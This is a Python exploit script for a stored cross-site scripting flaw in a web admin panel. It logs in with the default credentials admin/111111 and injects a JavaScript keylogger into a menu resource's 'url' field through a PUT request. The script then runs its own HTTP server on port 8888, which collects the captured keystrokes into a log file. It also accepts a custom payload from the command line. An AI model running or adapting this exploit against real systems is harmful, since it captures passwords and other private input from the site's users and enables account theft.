import requests
import sys
import json
import http.server
import socketserver
import urllib
import urllib.parse

PORT = 8888


class MyHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path.startswith('/data') and 'letter=' in self.path:
                letter = self.path.split('=')[1]
                
                #print(letter)
                with open("log_output.txt", "a") as output:
                    if letter == "Shift" or letter == "Alt" or letter == "AltGraph":
                        pass                   
                    elif letter == "Enter":
                        output.write("\n")
                    else:
                        output.write(urllib.parse.unquote(letter))

                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(letter.encode())
            else:
                # Use the default handler for all other requests
                handler.do_GET(self)

        def send_head(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            return None

def make_request(method, uri, headers, body):
    response = ""

    if method == "GET":
        response = requests.get(url+uri, headers=headers)
    elif method == "POST":
        response = requests.post(url+uri, json=body, headers=headers)
    elif method == "PUT":
        response = requests.put(url+uri, json=body, headers=headers)
    else:
        print("error")


    return response


def start_keylogger_server():
    handler = http.server.SimpleHTTPRequestHandler

    # Set up a socket server to listen on the specified port with the custom handler
    httpd = socketserver.TCPServer(("", PORT), MyHandler)

    print(f"Serving at port {PORT}")

    # Start the server and keep it running until interrupted
    try:
        httpd.serve_forever()

    except KeyboardInterrupt:
        pass
    
    httpd.server_close()
    print("Server stopped.")




if __name__ == '__main__':
    url = "http://localhost:10000"

    login_page_uri = "/user/login"
    index_uri = "/web/views/index/index.html"
    menu_uri = "/resource/menus"
    home_uri = "/web/views/home/home.html"
    menu_uri_2 = "/web/views/menu/menu.html"
    tree_uri = "/resource/treeList"
    edit_uri = "/web/views/addmenu/addmenu.html?id=9"
    resource_uri = "/resource/9"
    resource_uri_2 = "/resource"

    login_data = {'username':'admin', 'password':'111111'}
    all_headers = {'Content-Type': 'application/json; charset=utf-8', 'Accept': 'application/json; charset=utf-8','User-Agent':'foo'}

    #response = requests.post(url+login_page_uri, json = login_data, headers={'Content-Type': 'application/json; charset=utf-8', 'Accept': 'application/json; charset=utf-8','User-Agent':'foo'})
    response = make_request("POST", login_page_uri, all_headers, login_data)
    data = response.json()
    jwt_token = data['token']

    all_headers['Cookie'] = 'JWT-SESSION='+jwt_token
    all_headers['Authorization'] = jwt_token

    #injected_script = '\"><script>document.onkeypress=function(event){fetch("http://localhost:8888/data?letter='+urllib.parse.urlencode(event.key)+'")}</script>'
   
    if len(sys.argv) == 1:
        injected_script = "\"><script>document.onkeydown=function(event){fetch('http://localhost:8888/data?letter='+encodeURIComponent(event.key))}</script>"
        custom = False
    elif len(sys.argv) == 2:
        custom = True
        injected_script = sys.argv[1]
    else:
        print("Too many arguments were passed from the command line")
        print("Specify one argument if you want to use your own payload or none to use a default js keylogger payload")
        exit(1)


    payload = {"type":"1", "name":"XSS Stored Injection", 
               "seq":"3", "method":"post", "url":injected_script,
               "pid":2, "id":"9"}
    



    response = make_request("GET", index_uri, all_headers, None)

    response = make_request("POST", menu_uri, all_headers, {})

    response = make_request("GET", home_uri, all_headers, None)

    response = make_request("GET", menu_uri_2, all_headers, None)

    response = make_request("GET", tree_uri, all_headers, None)
    
    response = make_request("GET", edit_uri, all_headers, None)

    response = make_request("POST", menu_uri, all_headers, {})

    response = make_request("GET", resource_uri, all_headers, None)

    response = make_request("PUT", resource_uri_2, all_headers, payload)

    if response.status_code == 200:
        response = make_request("POST", menu_uri, all_headers, {})

        response = make_request("GET", menu_uri_2, all_headers, None)

        response = make_request("GET", tree_uri, all_headers, None)


        if not custom:
            print("Default payload injected successfully!")
            print("Starting keylogger server...")
            start_keylogger_server()
        else:
            print("Custom payload injected, exploitation completed!")
    
    else:
        print("Payload injection didn't succeed")
        exit(0)





